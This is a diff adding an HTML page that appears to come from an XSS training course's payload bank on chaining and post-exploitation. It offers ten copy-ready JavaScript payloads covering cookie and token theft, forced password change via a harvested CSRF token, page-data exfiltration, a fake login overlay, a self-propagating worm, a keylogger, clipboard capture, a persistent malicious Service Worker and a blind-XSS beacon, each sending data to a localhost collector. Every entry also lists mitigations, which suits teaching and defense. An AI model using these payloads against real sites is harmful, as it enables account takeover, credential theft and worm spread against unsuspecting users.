@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 08 — Chaining &amp; Post-Exploitation</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-chain{background:#2a0000;color:var(--danger)}
+  .t-impact{background:#1a1500;color:var(--warn)}
+  .t-technique{background:#001a1a;color:var(--ok)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>08 — Chaining &amp; Post-Exploitation Payloads</h1>
+<div class="sub">10 payloads · Module reference: M15 · Lab: run <code>make py</code> in module_15/ — these payloads need a live authenticated session</div>
+
+<div class="section-label">A. Cookie &amp; Token Exfiltration</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">COOKIE THEFT</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="new Image().src='http://localhost:5001/oob?c='+encodeURIComponent(document.cookie)"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Session hijacking — attacker replays stolen cookie to authenticate as victim</span>
+    <span class="meta-key">Requires</span><span class="meta-val">Cookie NOT HttpOnly (HttpOnly prevents JS reading document.cookie)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">HttpOnly cookie flag; CSP connect-src; SameSite=Strict</span>
+    <span class="meta-key">Note</span><span class="meta-val">Even with HttpOnly, XSS can still forge authenticated requests (see P03). Cookie theft is only one chain — not having cookies readable doesn't prevent account takeover.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">LOCALSTORAGE DUMP</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  const data = {
+    ls: JSON.stringify(localStorage),
+    ss: JSON.stringify(sessionStorage),
+    cookie: document.cookie,
+    url: location.href
+  };
+  fetch('http://localhost:5001/oob?' + new URLSearchParams(data));
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">JWT theft, OAuth token exfil, any client-side state (modern SPAs store tokens in localStorage)</span>
+    <span class="meta-key">Requires</span><span class="meta-val">XSS execution in the SPA's origin</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP connect-src limiting fetch targets; storing sensitive tokens in memory not localStorage</span>
+    <span class="meta-key">Note</span><span class="meta-val">React/Vue/Angular SPAs that use JWTs commonly store them in localStorage — accessible to any JS on the same origin. One XSS → all tokens exfiltrated. Recommendation: store JWTs in memory (variable) or HttpOnly cookies, not localStorage.</span>
+  </div>
+</div>
+
+<div class="section-label">B. CSRF Token Theft → Forced Action</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">ACCOUNT TAKEOVER</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  fetch('/auth/settings')
+    .then(r =&gt; r.text())
+    .then(html =&gt; {
+      const token = (html.match(/name=['\"]csrf['\"].*?value=['\"]([^'\"]+)/s)||[])[1]||'';
+      return fetch('/auth/change-password', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'csrf=' + encodeURIComponent(token) +
+              '&amp;new_password=hacked123&amp;confirm=hacked123'
+      });
+    })
+    .then(() =&gt; new Image().src = 'http://localhost:5001/oob?pwned=changepw')
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Full account takeover — victim's password changed without their knowledge</span>
+    <span class="meta-key">Why CSRF tokens don't help</span><span class="meta-val bypasses">XSS runs same-origin → can read any page → CSRF token is visible in the HTML response → submits valid request with token</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Re-authentication for password change (require current password); CSP; preventing XSS in the first place</span>
+    <span class="meta-key">Note</span><span class="meta-val">The two-step async chain: first GET /settings to harvest the CSRF token, then POST with it. CSRF protection is designed for cross-origin requests — it's ineffective once you have same-origin code execution.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">DATA EXFIL</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // Exfiltrate all visible page data — emails, PII, account numbers
+  fetch('/account/statement')
+    .then(r =&gt; r.text())
+    .then(html =&gt; {
+      // Strip HTML tags, compress whitespace
+      const text = html.replace(/&lt;[^&gt;]+&gt;/g, ' ').replace(/\s+/g, ' ').trim();
+      // Split into chunks (URL length limit)
+      for (let i = 0; i &lt; text.length; i += 1500) {
+        new Image().src = 'http://localhost:5001/oob?chunk=' + i +
+          '&amp;d=' + encodeURIComponent(text.slice(i, i+1500));
+      }
+    })
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Exfiltration of any page accessible to the authenticated victim — financial statements, messages, PII</span>
+    <span class="meta-key">Technique</span><span class="meta-val">fetch same-origin pages, strip HTML, chunk + exfiltrate via Image beacon</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP connect-src; preventing XSS at source</span>
+    <span class="meta-key">Note</span><span class="meta-val">This payload crawls the victim's own account pages. Any page they can see, the XSS payload can read. Image beacons (new Image().src=…) bypass connect-src in some CSP configs — must also restrict img-src.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Credential Overlay</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">CREDENTIAL PHISHING</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+(function(){
+  const ov = document.createElement('div');
+  ov.style.cssText = 'position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center';
+  ov.innerHTML = '\
+    &lt;div style=\"background:#fff;padding:36px;border-radius:12px;width:380px;font-family:-apple-system,sans-serif;box-shadow:0 20px 60px rgba(0,0,0,.5)\"&gt;\
+      &lt;img src=\"/favicon.ico\" style=\"width:32px;margin-bottom:12px\"&gt;\
+      &lt;h2 style=\"margin:0 0 6px;font-size:20px;color:#111\"&gt;Your session expired&lt;/h2&gt;\
+      &lt;p style=\"font-size:13px;color:#666;margin:0 0 20px\"&gt;Please sign in to continue.&lt;/p&gt;\
+      &lt;input id=ov-e type=email placeholder=Email style=\"width:100%;padding:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;margin-bottom:10px;box-sizing:border-box\"&gt;\
+      &lt;input id=ov-p type=password placeholder=Password style=\"width:100%;padding:10px;border:1px solid #ddd;border-radius:6px;font-size:14px;margin-bottom:16px;box-sizing:border-box\"&gt;\
+      &lt;button id=ov-b style=\"width:100%;padding:12px;background:#1a56db;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer\"&gt;Sign in&lt;/button&gt;\
+    &lt;/div&gt;';
+  document.body.appendChild(ov);
+  document.getElementById('ov-b').onclick = function(){
+    const e=document.getElementById('ov-e').value;
+    const p=document.getElementById('ov-p').value;
+    new Image().src='http://localhost:5001/oob?e='+encodeURIComponent(e)+'&amp;p='+encodeURIComponent(p);
+    ov.remove();
+  };
+})();
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Credential theft via pixel-perfect phishing overlay on the legitimate domain</span>
+    <span class="meta-key">Why it's effective</span><span class="meta-val">URL bar shows the real domain; browser shows no warnings; overlay uses the site's own favicon and styling</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP (blocks inline event handlers — onclick on injected button); hardware security keys (passkeys can't be phished); preventing XSS</span>
+    <span class="meta-key">Note</span><span class="meta-val">Password managers with domain-binding won't autofill into injected overlays — another reason to use password managers. But users who type credentials manually are fully exposed. The overlay removes itself after submission — victim continues normally, unaware.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Self-Propagating Worm Skeleton</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">WORM</span><span class="tag t-impact">SELF-PROPAGATING</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+(function worm(){
+  // Step 1: get CSRF token
+  fetch('/auth/settings').then(r=&gt;r.text()).then(html=&gt;{
+    const csrf = (html.match(/name=['\"]csrf['\"].*?value=['\"]([^'\"]+)/s)||[])[1]||'';
+
+    // Step 2: replicate — copy worm payload into current user's profile/bio
+    const payload = document.currentScript
+      ? document.currentScript.outerHTML
+      : '&lt;img src=x onerror=\"[WORM]\"&gt;';  // fallback (replace with full payload)
+
+    fetch('/auth/profile', {
+      method: 'POST',
+      headers: {'Content-Type':'application/x-www-form-urlencoded'},
+      body: 'csrf='+encodeURIComponent(csrf)+'&amp;bio='+encodeURIComponent(payload)
+    });
+
+    // Step 3: add attacker as friend / follow (social propagation vector)
+    fetch('/social/follow', {
+      method: 'POST',
+      headers: {'Content-Type':'application/x-www-form-urlencoded'},
+      body: 'csrf='+encodeURIComponent(csrf)+'&amp;user=attacker'
+    });
+
+    // Step 4: OOB notification
+    new Image().src = 'http://localhost:5001/oob?worm=infected&amp;victim='+encodeURIComponent(location.href);
+  });
+})();
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Viral propagation — every infected profile infects every visitor; exponential spread (Samy worm pattern)</span>
+    <span class="meta-key">Requires</span><span class="meta-val">Stored XSS sink in a user-visible field; write-back capability (update profile/post)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Output encoding at display time; rate-limiting profile updates; CSP; sandboxing user content on separate subdomains</span>
+    <span class="meta-key">Note</span><span class="meta-val">The worm pattern from M16. Three conditions for a worm: (1) stored XSS sink, (2) write-back to a visible field, (3) that field is shown to other users. Breaking any one condition stops propagation. The Samy worm spread to 1M accounts in 20 hours with exactly this structure.</span>
+  </div>
+</div>
+
+<div class="section-label">E. Keylogger &amp; Clipboard Capture</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">KEYLOGGER</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  let buf = '';
+  document.addEventListener('keydown', e =&gt; {
+    buf += e.key;
+    if (buf.length &gt; 50) {
+      new Image().src = 'http://localhost:5001/oob?k=' + encodeURIComponent(buf);
+      buf = '';
+    }
+  });
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Captures all keystrokes on the page — passwords, messages, search queries</span>
+    <span class="meta-key">Technique</span><span class="meta-val">document-level keydown listener buffers keystrokes and exfiltrates in chunks</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP (blocks inline event handler setup in onerror); CSP img-src restricting beacon targets; preventing XSS</span>
+    <span class="meta-key">Note</span><span class="meta-val">Fires on every key including backspace, enter, and modifier keys. Password field content is captured as the user types, before any form submission. The buffer approach avoids making a network request per keystroke.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">CLIPBOARD</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  document.addEventListener('copy', async () =&gt; {
+    try {
+      const text = await navigator.clipboard.readText();
+      new Image().src = 'http://localhost:5001/oob?clip=' + encodeURIComponent(text);
+    } catch(e) {}
+  });
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Captures clipboard content on every copy operation — passwords from password managers, sensitive data</span>
+    <span class="meta-key">Requires</span><span class="meta-val">clipboard-read permission (browser prompts user — often auto-denied); copy event fires freely but readText requires permission</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Browser clipboard permission model; CSP; preventing XSS</span>
+    <span class="meta-key">Note</span><span class="meta-val">navigator.clipboard.readText() requires the "clipboard-read" permission. The copy event fires without permission. Combined: waits for user to copy something, then attempts to read clipboard. Permission prompt may alert the user.</span>
+  </div>
+</div>
+
+<div class="section-label">F. Persistence</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">PERSISTENCE</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // Register a malicious Service Worker that intercepts all requests
+  if ('serviceWorker' in navigator) {
+    const swCode = \`
+      self.addEventListener('fetch', e =&gt; {
+        // Log all requests to attacker server
+        fetch('http://localhost:5001/oob?sw_url=' + encodeURIComponent(e.request.url));
+        // Or: intercept and modify responses
+      });
+    \`;
+    const blob = new Blob([swCode], {type:'application/javascript'});
+    const url = URL.createObjectURL(blob);
+    navigator.serviceWorker.register(url)
+      .then(() =&gt; new Image().src = 'http://localhost:5001/oob?sw=registered');
+  }
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Persistent interception of all page requests — survives page reload, logs all network activity</span>
+    <span class="meta-key">Requires</span><span class="meta-val">HTTPS (Service Workers require secure context); same-origin SW registration scope</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP worker-src (blocks blob: URL for SW); Service Worker scope restrictions; clearing SW registrations; HTTPS only (protects against network-level but not same-origin XSS)</span>
+    <span class="meta-key">Note</span><span class="meta-val">Service Workers persist after the page is closed. Once registered from an XSS payload, the SW intercepts every subsequent request to the origin — even in a clean browser tab. CSP <code>worker-src</code> blocking blob: URLs prevents registration from an XSS payload.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-chain">CHAIN</span><span class="tag t-impact">BLIND OOB</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // Complete blind XSS callback with full context
+  const payload = {
+    url: location.href,
+    title: document.title,
+    cookie: document.cookie,
+    ls: JSON.stringify(localStorage),
+    referrer: document.referrer,
+    ua: navigator.userAgent,
+    ts: new Date().toISOString(),
+    dom: document.documentElement.innerHTML.slice(0, 2000)
+  };
+  // Use sendBeacon for reliability (fires even if page navigates away)
+  navigator.sendBeacon('http://localhost:5001/oob', JSON.stringify(payload));
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Blind XSS callback — captures full page context when attacker cannot watch execution directly (admin panels, log viewers, PDF generators)</span>
+    <span class="meta-key">Technique</span><span class="meta-val">sendBeacon() fires even on page unload; includes full DOM snapshot, cookies, localStorage, UA, timestamp</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP connect-src; output encoding at the admin panel display; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val">Blind XSS (M11 pattern). The payload fires in an admin panel where the attacker has no visibility. sendBeacon is preferred over Image() for blind XSS — it fires reliably even when the admin quickly closes the page or it's a headless PDF renderer.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="07_mxss.html">← 07: mXSS</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="09_exotic_modern.html">09: Exotic &amp; Modern →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => { btn.textContent = 'copied!'; setTimeout(() => btn.textContent = 'copy', 1500); });
+});
+</script>
+</body>
+</html>
